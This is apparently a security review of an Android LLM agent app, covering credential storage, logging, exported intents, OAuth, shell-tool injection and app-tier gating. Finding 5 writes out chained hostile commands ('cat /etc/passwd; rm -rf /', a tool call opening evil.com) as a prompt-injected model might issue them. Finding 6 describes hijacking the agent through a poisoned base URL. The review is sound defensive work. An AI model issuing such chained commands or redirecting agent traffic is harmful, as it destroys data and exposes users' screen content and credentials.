# Security & Privacy Review

**Date:** 2026-04-08
**Scope:** Auth, LLM credentials, accessibility data, approval system, traces, settings, network, manifest, onboarding
**Method:** Double-review (offensive + defensive perspectives), then synthesis

---

## Finding 1: Encrypted Storage Silent Fallback to Plaintext

**Severity:** HIGH
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/auth/OAuthCredentialStore.kt:46-49`
- `app/src/main/kotlin/com/moonkey/androidagent/app/AppSettingsStore.kt:89-93`
- `app/src/main/kotlin/com/moonkey/androidagent/onboarding/OnboardingStore.kt:57-61`

**What:** All three encrypted storage implementations silently fall back to plain `SharedPreferences` when `EncryptedSharedPreferences` fails (e.g., KeyStore corruption, device restore). Once `prefsFailed = true`, every subsequent read/write for that store goes to plaintext for the lifetime of the process.

**Threat model:** An attacker with physical access or a root exploit reads `/data/data/com.moonkey.androidagent/shared_prefs/` and obtains OAuth refresh tokens, API keys, and access tokens in cleartext. The user is never informed their credentials are stored insecurely.

**Impact:** Full credential compromise. OAuth refresh tokens grant persistent API access. API keys grant direct billing access.

**What to do:**
- When fallback occurs, set a flag observable by the UI and show a warning banner: "Credential storage is degraded -- re-enter keys after device restart."
- For OAuth tokens specifically, refuse to persist the refresh token to plaintext -- require re-authentication instead.
- Log at ERROR level, not WARN, so it surfaces in crash reporting.

---

## Finding 2: id_token Claims Logged to Logcat

**Severity:** HIGH
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/auth/OpenAIOAuth.kt:203-209`

**What:** The OAuth token exchange function decodes the id_token JWT payload and logs the full claims JSON via `Log.d(TAG, "id_token claims: $payload")`. This payload contains the user's email, OpenAI account ID, organization memberships, and subscription tier.

**Threat model:** On a shared device or via ADB, any process with READ_LOGS permission (or any developer running `adb logcat`) captures the full id_token claims. On older Android versions (<4.1), logcat was world-readable.

**Impact:** PII exposure (email, account structure). The data is also useful for account takeover reconnaissance.

**What to do:** Delete the debug log at line 208. If debugging is needed, use a conditional block gated on `BuildConfig.DEBUG` with only the token length, not the content.

---

## Finding 3: API Key Loaded from World-Readable External Storage

**Severity:** HIGH
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/app/AppSettingsStore.kt:299-317`

**What:** `loadApiKeyFromFile()` reads an API key from `/sdcard/api_key.txt`. On Android 10 and below (or with `MANAGE_EXTERNAL_STORAGE`), this file is readable by all apps. The method also silently ingests and persists the key into encrypted storage without user confirmation.

**Threat model:** A malicious app writes a poisoned API key to `/sdcard/api_key.txt` that routes requests to an attacker-controlled proxy. Or a co-installed app reads the user's legitimate key from that path.

**Impact:** API key theft or poisoned API key injection (prompt injection relay).

**What to do:**
- Remove this file-based fallback entirely. Credential entry should only happen through the UI or intent extras (which require the caller to have the key already).
- If the eval/debug use case requires it, gate behind `BuildConfig.DEBUG`.

---

## Finding 4: Insecure SSL Config Instantiated at Class Load Time

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/llm/InsecureSslConfig.kt:36-39`

**What:** The `insecureTrustManager` object is instantiated as an unconditional field initializer. The `BuildConfig.DEBUG` check only guards the public getters. If any code path (including reflection, proguard misconfiguration, or a new consumer) accesses the private field directly, SSL validation is bypassed in release.

**Threat model:** A code change or obfuscation bug routes release traffic through the insecure trust manager, enabling MITM on all LLM API calls (bearer tokens, full prompts, screen data).

**Impact:** Full credential and data interception.

**What to do:** Move the trust manager instantiation inside the getter so it is never created in release builds. Better: use a compile-time `debugImplementation` dependency that provides the insecure config only in debug builds, making it impossible to reference in release.

---

## Finding 5: Shell Tool Command Injection via Argument Chaining

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/tool/impl/ShellTool.kt:44-48, 83`

**What:** The blocklist checks only the first whitespace-delimited token. Commands like `cat /etc/passwd; rm -rf /` or `ls $(reboot)` bypass the check because the first token (`cat`, `ls`) is not blocked. The command is passed to `sh -c`, which interprets shell metacharacters (`; | & $ () ``).

**Threat model:** The LLM is the attacker (prompt injection or adversarial task). The LLM crafts a tool call like `shell(command="cat /data/local/tmp/foo; am start -a android.intent.action.VIEW -d http://evil.com")`. The first token passes validation, but the chained command executes.

**Impact:** Arbitrary command execution as the app process. While sandboxed to the app's UID, the agent has accessibility permissions -- the shell can interact with the accessibility service APIs.

**What to do:**
- Reject commands containing shell metacharacters: `; | & $ ( ) \` { }`.
- Or pass the command as `ProcessBuilder("sh", "-c", command)` with individual argument splitting (no shell interpretation). Even better: use `ProcessBuilder` directly with an argument array (no `sh -c`) and only allow an explicit whitelist of binaries (`cat`, `ls`, `stat`, `find`).

---

## Finding 6: Intent-Based API Key Injection Without Caller Verification

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/app/MainActivityIntentPayload.kt:29-31`
- `app/src/main/kotlin/com/moonkey/androidagent/app/MainActivityIntentApplier.kt:17-22`
- `app/src/main/AndroidManifest.xml:32` (MainActivity `exported="true"`)

**What:** `MainActivity` is exported and accepts `EXTRA_API_KEY`, `EXTRA_OPENROUTER_API_KEY`, `EXTRA_NOVITA_API_KEY`, and `EXTRA_OPENAI_BASE_URL` from any app. The intent applier writes these directly to persistent encrypted storage and overrides the auth method. There is no caller verification.

**Threat model:** A malicious app sends an intent with a poisoned `EXTRA_OPENAI_BASE_URL` pointing to an attacker proxy and a valid-looking API key. All subsequent LLM requests (containing full screen content, prompts, and user instructions) route to the attacker.

**Impact:** Full exfiltration of all data sent to the LLM, plus ability to inject arbitrary responses (controlling the agent's actions on the device).

**What to do:**
- Do not persist API keys or base URLs from intents to long-term storage. Use them only for the current session (transient).
- Validate `EXTRA_OPENAI_BASE_URL` against an allowlist of known provider domains.
- Consider requiring a signature-level permission for intent extras that modify security-critical settings, or restrict to `adb shell am start` usage only (check calling UID).

---

## Finding 7: OAuth Callback Server Vulnerable to Local Attacker Race

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/auth/OpenAIOAuth.kt:87-88, 99-150`

**What:** The OAuth callback listens on `localhost:1455` and accepts the first connection. A local attacker app can connect first, either to steal the authorization code (if it arrives) or to inject a crafted callback response before the real browser callback arrives.

**Threat model:** A co-installed malicious app on the same device opens a connection to `localhost:1455` immediately after detecting the OAuth browser launch. It either intercepts the real callback (stealing the auth code) or sends a spoofed callback.

**Impact:** OAuth authorization code theft, leading to access token acquisition for the user's OpenAI account.

**What to do:**
- Bind the server socket to `127.0.0.1` explicitly (already done via `ServerSocket(port)` default, but verify).
- Validate the HTTP `Host` header matches `localhost:1455`.
- Consider using Android Custom Tabs with a redirect URI scheme (`androidagent://callback`) instead of a localhost server, which is the standard Android OAuth pattern and eliminates the local network attack surface entirely.

---

## Finding 8: AppClassifier Fails Open on Missing/Corrupt Asset

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/tool/AppClassifier.kt:66-73`

**What:** If `app_tiers.json` fails to load (missing file, JSON parse error, I/O error), `fromAssets()` returns an empty classifier. With an empty classifier, `classify(pkg)` returns `CAUTIOUS` for all apps. Combined with `AUTO_APPROVE` mode, all apps including banking/auth apps would be auto-approved (since `BLOCKED` tier never applies).

**Threat model:** A corrupted APK update or asset loading race condition causes the tier database to be empty. The agent then operates unrestricted on financial and authentication apps.

**Impact:** Agent interacts with banking, crypto, and password manager apps without any safety gate.

**What to do:** Treat load failure as fatal for the policy engine. If the file cannot be loaded, refuse to start a session rather than operating with no safety rails. At minimum, hardcode a small critical blocklist as fallback.

---

## Finding 9: Verbose LLM Input/Output Logging in Debug Builds

**Severity:** MEDIUM
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/llm/LlmLogger.kt:9-96`

**What:** In debug builds, `LlmLogger` writes system prompts (up to 2000 chars), conversation history, tool call arguments, and LLM responses to `Log.i`. This includes screen content from accessibility trees, which may contain messages, contacts, passwords visible on screen, and financial data.

**Threat model:** Debug builds distributed to testers, or a user who installs a debug APK. Any process with logcat access reads full LLM conversation history including screen content.

**Impact:** PII and sensitive screen content exposure via logcat.

**What to do:** This is acceptable for local development but should be further restricted. Consider writing debug logs to a private file (not logcat) or truncating screen content from input item logs. The existing 2000-char truncation helps but still leaks substantial content.

---

## Finding 10: Trace Files Written to External Storage Without Encryption

**Severity:** LOW
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/trace/FileTraceRecorder.kt:47-48`
- `app/src/main/kotlin/com/moonkey/androidagent/trace/AgentTraceArtifacts.kt:181-193`

**What:** Trace recordings (JSONL events, screenshots, accessibility trees, prompts, tool results) are written to disk. The `CognitionTraceRedactor` redacts emails, bearer tokens, JWTs, and long tokens from text artifacts. However, screenshots are stored as raw JPEG bytes without any redaction. Accessibility tree content that doesn't match the regex patterns (phone numbers, addresses, financial amounts) passes through unredacted.

**Threat model:** A user enables tracing (or it's enabled by debug mode), and the trace directory is later accessed by another app (if on external storage) or via ADB backup.

**Impact:** Partial PII leakage through screenshots and unredacted accessibility tree data.

**What to do:**
- The redactor is well-designed and covers the most critical patterns. Consider adding phone number and financial amount patterns.
- Ensure trace files are written to app-private internal storage only. Verify `rootDir` is under `context.filesDir`, not external storage.
- Screenshots are inherently hard to redact. Document that trace mode should only be enabled during development/testing.

---

## Finding 11: OAuth Token Not Validated Cryptographically

**Severity:** LOW
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/auth/OpenAIOAuth.kt:351-363`

**What:** `parseEmailFromJwt()` decodes the JWT payload without signature verification. The comment says "token came over TLS." While the access token itself does come over a TLS-protected channel from OpenAI's token endpoint, the function is also used on tokens that may be loaded from persistent storage or passed through intents.

**Threat model:** An attacker who modifies the persisted token file could inject a crafted JWT with a spoofed email, which the UI would display. The actual API authentication would fail at the server, so this is cosmetic.

**Impact:** Cosmetic -- wrong email displayed in UI. No functional security bypass since the server validates the token independently.

**What to do:** Acceptable as-is. The comment accurately describes the trust model. The email is for display purposes only.

---

## Finding 12: Debug Broadcast Receivers Exported on Debug Builds

**Severity:** LOW
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/app/AgentServiceReceiverHelpers.kt:10-18, 30-38`

**What:** `STOP_AGENT` and `ACTION_DEBUG_EXEC` broadcast receivers are registered with `RECEIVER_EXPORTED` on debug builds. Any app can send these broadcasts to stop the agent or trigger debug action execution.

**Threat model:** A malicious app disrupts the agent by sending `STOP_AGENT`, or triggers debug actions via `ACTION_DEBUG_EXEC`.

**Impact:** Limited to debug builds, which are not distributed to end users. The `ActionDebugReceiver` does reject execution when a session is active, providing some protection.

**What to do:** Acceptable for debug builds. The `BuildConfig.DEBUG` gate is properly applied. Consider adding a signature-level permission check for the debug exec receiver as defense-in-depth.

---

## Finding 13: Shizuku Provider Exported with High-Privilege Permission

**Severity:** LOW
**Files:**
- `app/src/main/AndroidManifest.xml:59-65`

**What:** The Shizuku content provider is declared `exported="true"` with `android:permission="android.permission.INTERACT_ACROSS_USERS_FULL"`. This is a signature-level system permission, so only system-signed apps or apps with root/Shizuku grant can access it.

**Threat model:** Only relevant if the device has Shizuku installed and the user has granted the agent Shizuku permissions. The attack surface is limited by the signature-level permission.

**Impact:** Minimal. The permission requirement is appropriate for the Shizuku integration pattern.

**What to do:** Acceptable. This follows the standard Shizuku integration pattern. Document that Shizuku mode expands the privilege surface.

---

## Finding 14: network_security_config.xml Correctly Configured

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/res/xml/network_security_config.xml`

**What:** Cleartext traffic is disabled by default (`cleartextTrafficPermitted="false"`). No debug-mode overrides are present in the network security config. The `allowBackup="false"` flag is set on the application element.

---

## Finding 15: PolicyEngine TOCTOU Guard Present

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/tool/ToolRouter.kt:195-225`

**What:** After user approval, the ToolRouter re-checks the foreground package to prevent time-of-check-to-time-of-use (TOCTOU) attacks where the user approves an action but the foreground app changes during the approval wait. This also checks for BLOCKED apps when the original package was unknown.

---

## Finding 16: Trace Redactor Coverage is Good

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/trace/CognitionTraceRedactor.kt`

**What:** The redactor covers emails, bearer tokens, JWTs, long tokens (with alpha+digit heuristic), and key-value pairs with sensitive key names (password, token, secret, authorization, cookie, session, api_key, apikey, access_key). The sensitive key list is comprehensive.

---

## Finding 17: API Key Fields Use Password Masking

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/ui/settings/ApiKeyFields.kt:96`

**What:** API key input fields use `PasswordVisualTransformation()` by default, with an explicit toggle to reveal. This prevents shoulder-surfing.

---

## Finding 18: AppClassifier Only Tightens, Never Loosens

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/tool/AppClassifier.kt:32-37`

**What:** `addUserOverride()` only allows tightening the tier (NORMAL to CAUTIOUS/BLOCKED, CAUTIOUS to BLOCKED). Users cannot weaken the security tier of apps classified by the built-in list. This is correct defense-in-depth.

---

## Finding 19: PKCE and CSRF State Properly Implemented

**Severity:** N/A (positive finding)
**Files:**
- `app/src/main/kotlin/com/moonkey/androidagent/auth/OpenAIOAuth.kt:30-42`

**What:** OAuth uses PKCE with S256 challenge method and a 16-byte SecureRandom state parameter for CSRF protection. The state is validated on callback receipt. This is correct.
